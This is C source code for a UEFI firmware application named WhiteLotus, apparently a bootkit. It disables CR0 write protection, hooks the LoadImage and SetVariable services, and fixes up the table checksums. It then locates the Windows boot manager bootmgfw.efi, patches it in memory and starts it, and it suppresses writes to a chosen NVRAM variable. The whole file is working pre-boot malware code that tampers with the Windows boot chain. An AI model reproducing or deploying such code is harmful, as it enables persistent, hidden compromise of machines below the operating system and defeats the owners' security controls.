#include "WhiteLotus.h"

STATIC EFI_IMAGE_LOAD OriginalLoadImageAddress = NULL;
STATIC EFI_SET_VARIABLE OriginalSetVariableAddress = NULL;
EFI_HANDLE gBootmgfwHandle = NULL;

EFI_EVENT mExitBootServicesEvent = NULL;
EFI_EVENT mSetVirtualAddressMapEvent = NULL;
BOOLEAN gAtTime = FALSE;

CHAR16 *NvramName = L"TestData";

EFI_STATUS EFIAPI HookedSetVariable(
  IN CHAR16   *VariableName,
  IN EFI_GUID *VendorGuid,
  IN UINT32    Attributes,
  IN UINTN     DataSize,
  IN VOID     *Data
) {
  DEBUG((DEBUG_INFO, "[White] HookedSetVariable was triggered!"));

  if (StrCmp(VariableName, NvramName) == 0) {
    DEBUG((DEBUG_INFO, "[White] Variable found.\n"));
    return EFI_SUCCESS;
  }
  EFI_STATUS Status = OriginalSetVariableAddress(VariableName, VendorGuid, Attributes, DataSize, Data);
  if (EFI_ERROR(Status)) {
      return Status;
  }
  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI HookedLoadImage(
	IN BOOLEAN BootPolicy,
	IN EFI_HANDLE ParentImageHandle,
	IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,
	IN VOID *SourceBuffer OPTIONAL,
	IN UINTN SourceSize,
	OUT EFI_HANDLE *ImageHandle
) {
  EFI_LOADED_IMAGE_PROTOCOL *LoadedImageProtocol;
  INPUT_FILETYPE FileType;

  Print(L"[WhiteLotus] Hooked LoadImage was triggered!\n");

  EFI_STATUS Status = OriginalLoadImageAddress(BootPolicy, ParentImageHandle, DevicePath, SourceBuffer, SourceSize, ImageHandle);
  if (EFI_ERROR(Status)) {
    Print(L"[WhiteLotus] Failed to Load the Image: %r\n", Status);
    return Status;
  }

  Status = gBS->OpenProtocol(*ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&LoadedImageProtocol, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
  if (EFI_ERROR(Status)) {
    Print(L"[WhiteLotus] Failed to open the protocol!\n");
    return Status;
  }

  FileType = GetInputFileType(LoadedImageProtocol->ImageBase, LoadedImageProtocol->ImageSize);
  if (Unknown == FileType) {
    return EFI_NOT_FOUND;
  }
  else if (BootmgfwEfi == FileType) {
    gBootmgfwHandle = *ImageHandle;
    LoadedImageProtocol->ParentHandle = NULL;
    Print(L"[WhiteLotus] Bootmgfw.efi was found: 0x%p\n", gBootmgfwHandle);
  }

  Status = PatchBootMgfw(FileType, LoadedImageProtocol->ImageBase, LoadedImageProtocol->ImageSize);
  if (EFI_ERROR(Status)) {
    Print(L"[WhiteLotus] Failed to Patch The Boot Manager: %r\n", Status);
    return Status;
  }
  return EFI_SUCCESS;
}

STATIC VOID *SetRuntimeServicePointer(
  IN OUT VOID **ServiceTableFunction,
  IN     VOID  *NewFunction
)
{
  if (NULL == ServiceTableFunction || NULL == NewFunction) {
    return NULL;
  }

  ASSERT(gBS != NULL);
  ASSERT(gBS->CalculateCrc32 != NULL);

  CONST EFI_TPL Tpl   = gBS->RaiseTPL(TPL_HIGH_LEVEL);
  CONST UINTN   Cr0   = AsmReadCr0();
  CONST BOOLEAN WpSet = (Cr0 & CR0_WP) != 0;

  if (WpSet) {
    AsmWriteCr0(Cr0 & ~CR0_WP);
  }
  VOID *OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction, *ServiceTableFunction, NewFunction);

  gRT->Hdr.CRC32 = 0;
  gBS->CalculateCrc32((UINT8 *)&gRT->Hdr, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);

  if (WpSet) {
    AsmWriteCr0(Cr0);
  }
  gBS->RestoreTPL(Tpl);

  return OriginalFunction;
}

VOID* HookServicePointer(
	IN OUT EFI_TABLE_HEADER *ServiceTableHeader,
	IN OUT VOID **ServiceTableFunction,
	IN VOID *NewFunction
) {
	if (ServiceTableFunction == NULL || NewFunction == NULL) {
    return NULL;
  }
	ASSERT(gBS != NULL);
	ASSERT(gBS->CalculateCrc32 != NULL);

  CONST EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);
	CONST UINTN Cr0 = AsmReadCr0();
	CONST BOOLEAN WpSet = (Cr0 & CR0_WP) != 0;
	if (WpSet) {
		AsmWriteCr0(Cr0 & ~CR0_WP);
  }
	VOID* OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction, *ServiceTableFunction, NewFunction);
	ServiceTableHeader->CRC32 = 0;
	gBS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32);

	if (WpSet) {
    AsmWriteCr0(Cr0);
  }
	gBS->RestoreTPL(Tpl);
	return OriginalFunction;
}

VOID EFIAPI WhiteLotusVirtualAddressMap(EFI_EVENT Event, VOID *Context) {
  EFI_STATUS Status;

  Status = EfiConvertPointer(0, (VOID**)&OriginalSetVariableAddress);
  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] Failed to EfiConvertPointer(OriginalSetVariableAddress): %r\n", Status));
  }
}

VOID EFIAPI WhiteLotusExitBootServices(EFI_EVENT Event, VOID *Context) {
  gAtTime = TRUE;
}

EFI_STATUS EFIAPI WhiteLotusEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
) {
  EFI_DEVICE_PATH_PROTOCOL          *DevicePath;
  EFI_HANDLE                        NewImageHandle;
  EFI_STATUS                        Status;
    EFI_HANDLE *HandleBuffer = NULL;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem = NULL;
  EFI_FILE_PROTOCOL *Root = NULL;
  EFI_FILE_PROTOCOL *File = NULL;
  UINTN HandleCount = 0;
  EFI_HANDLE TargetDeviceHandle = NULL;
  CHAR16 *BootMgrPath = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";

  // Hook LoadImage()
  OriginalLoadImageAddress = (EFI_IMAGE_LOAD)HookServicePointer(&gBS->Hdr, (VOID **)&gBS->LoadImage, (VOID **)&HookedLoadImage);
  if (NULL == OriginalLoadImageAddress) {
    Print(L"Failed to hook LoadImage()!\n");
    return EFI_NOT_FOUND;
  }
  Print(L"LoadImage was hooked: 0x%p -> 0x%p\n",
      (VOID*)OriginalLoadImageAddress, (VOID*)&HookedLoadImage);

  Print(L"Hooking SetVariable()...\n");
  OriginalSetVariableAddress = (EFI_SET_VARIABLE)SetRuntimeServicePointer(
      (VOID **)&gRT->SetVariable, (VOID *)&HookedSetVariable);
  if (NULL == OriginalSetVariableAddress) {
    return EFI_NOT_FOUND;
  }
  Print(L"SetVariable() hooked: 0x%p -> 0x%p\n",
      (VOID *)OriginalSetVariableAddress, (VOID *)&HookedSetVariable);

  Status = gBS->CreateEvent(EVT_SIGNAL_EXIT_BOOT_SERVICES, TPL_NOTIFY, WhiteLotusExitBootServices, NULL, &mExitBootServicesEvent);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to Create Event for the bootservices: %r\n", Status);
    return Status;
  }

  Status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, WhiteLotusVirtualAddressMap, NULL, &mSetVirtualAddressMapEvent);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to Create Event for the virtual address: %r\n", Status);
    return Status;
  }

  // Locate and load Windows boot manager
  Print(L"Searching for bootmgfw.efi across all volumes...\n");

  // 1. Locate all Simple File System (Disk/USB partitions) devices
  Status = gBS->LocateHandleBuffer(
    ByProtocol,
    &gEfiSimpleFileSystemProtocolGuid,
    NULL,
    &HandleCount,
    &HandleBuffer
  );

  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] Failed to locate any file systems: %r\n", Status));
    return Status;
  }

  // 2. Iterate through each disk partition and search for the file
  for (UINTN i = 0; i < HandleCount; i++) {
    Status = gBS->HandleProtocol(
      HandleBuffer[i],
      &gEfiSimpleFileSystemProtocolGuid,
      (VOID **)&FileSystem
    );

    if (EFI_ERROR(Status)) continue;

    // Open the volume's root directory
    Status = FileSystem->OpenVolume(FileSystem, &Root);
    if (EFI_ERROR(Status)) continue;

    // Attempt to open the file in Read-Only mode
    Status = Root->Open(
      Root,
      &File,
      BootMgrPath,
      EFI_FILE_MODE_READ,
      0
    );

    // File was found
    if (!EFI_ERROR(Status)) {
      DEBUG((DEBUG_INFO, "[WhiteLotus] bootmgfw.efi found on handle index %d!\n", i));
      TargetDeviceHandle = HandleBuffer[i]; // Store the correct partition handle

      File->Close(File);
      Root->Close(Root);
      break; // Exit the loop since the file was found
    }

    Root->Close(Root);
  }

  // Release handle buffer to prevent memory leaks
  if (HandleBuffer != NULL) {
    gBS->FreePool(HandleBuffer);
  }

  // 3. Exit if the file was not found on any partition
  if (TargetDeviceHandle == NULL) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] bootmgfw.efi could not be found on any mapped partition!\n"));
    return EFI_NOT_FOUND;
  }

  // 4. Construct the Device Path using the correct device handle
  DevicePath = FileDevicePath(TargetDeviceHandle, BootMgrPath);
  if (NULL == DevicePath) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] Failed to create device path for bootmgfw.efi\n"));
    return EFI_OUT_OF_RESOURCES;
  }
  Print(L"The Device was handled dynamically!\n");

  Status = gBS->LoadImage(FALSE, ImageHandle, DevicePath, NULL, 0, &NewImageHandle);
  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] Failed to load the image: %r\n", Status));
    return Status;
  }
  Print(L"Image was loaded\n");

  // 5. Start Windows
  Status = gBS->StartImage(NewImageHandle, NULL, NULL);
  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] Failed to start the image: %r\n", Status));
    return Status;
  }

  return EFI_SUCCESS;
}